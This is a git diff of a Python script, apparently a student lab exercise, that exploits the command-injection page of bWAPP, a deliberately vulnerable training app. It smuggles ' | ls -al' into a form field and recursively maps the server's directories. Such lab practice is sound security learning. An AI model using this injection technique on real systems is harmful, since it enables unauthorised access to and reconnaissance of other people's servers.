@@ -13,67 +13,73 @@ data = {
     }
 
 
-result_dir = {}
-
-
 #1. 일단 html연결하고 파싱할 데이터 들고오기
 def Get(directory_name):
 
     data['target'] = f" | ls -al {directory_name}"
     response = requests.post("http://192.168.96.142/bWAPP/commandi.php", headers=headers, data=data)
     if response.status_code == 200:
-           html = response.text
+        html = response.text
+        return BeautifulSoup(html, 'html.parser')
     else:
         print("Error fetching HTML:", response.status_code)
-    return BeautifulSoup(html, 'html.parser')
-        
-
+        return None
+    
+    
 
 #2. 결과로부터 디렉토리 목록을 파싱하는 함수
 def parse_directories(directory_name,depth=1):
+    soup = Get(directory_name)
+    dir_listing = soup.select_one('p[align="left"]')
     
-    handler = Get(directory_name) 
-
-    #해당 위치에서 디렉토리 몇개있나 출력
-    dir_listing = handler.select_one('p[align="left"]')
+    result = []
+    
     if dir_listing:
         split_dir = dir_listing.text.split('\n') #list
-        dir={} #임시 result_dir 딕셔너리 역할
-        for index,line in enumerate(split_dir) :
-            
-            if line.startswith('d'): #디렉토리면!!!
+
+        for line in split_dir :
+
+            if line.strip() and line.startswith('d')and not line.endswith('.'): #디렉토리면!!!
                 parts = line.split()
                 dir_name = parts[-1]
-                parse_directories(dir_name,depth += 1) 
+                result.append(dir_name)        
+                sub_result = parse_directories(dir_name, depth + 1)  # 재귀 호출
+                if sub_result is not None:  # 반환값이 None이 아니면 결과에 추가
+                    result.extend(sub_result) 
 
-            else : #파일이면!!!
-                if line.strip():  # 빈 줄이 아닌 경우에만 처리
-                    parts = line.split()
-                    file_name = parts[-1]
-                    dir[f"depth :{depth}"] = file_name
+            elif line.strip() and not line.endswith('.'):  # 빈 줄이 아닌 경우에만 처리
+                parts = line.split()
+                file_name = parts[-1]
+                result.append((f"{file_name}", directory_name))
                     
-                       
-    else : print("No directory listing found.")
- 
-    return dir
+    else : print(f"HTML 파싱 실패!!: {directory_name},{depth}, 디렉토리명 : {directory_name}")
+
+    """ result_dir = {}
+    for item in result:
+        file_name, parent_dir = item
+        if file_name == '.':
+            result_dir[file_name] = '.'
+        else :
+            result_dir[file_name] = parent_dir """
+    print(result)
+    return result
+
+
+parse_directories('.',depth=1)
     
-#3. 결과 리스트에 모두 넣기
-def make_result():
-    pass
-
-def toxl(args,data): #excel name 변수.
-    fd = open("{}.csv", "a").format(args)
-    fd.write(data)
-    fd.close()
 
 
+
+'''
 # 메인 함수
 def main():
-
-    result_dir = parse_directories('.',depth=1)
-    toxl("beebox_result", result_dir)
+    a =parse_directories('.',depth=1)
+    book = openpyxl.Workbook()
+    sheet = book.active
+    sheet.append(a)
+    book.save("result.xlsx")
+    book.close()
 
 if __name__ == "__main__":
     main()
-
- 
+'''
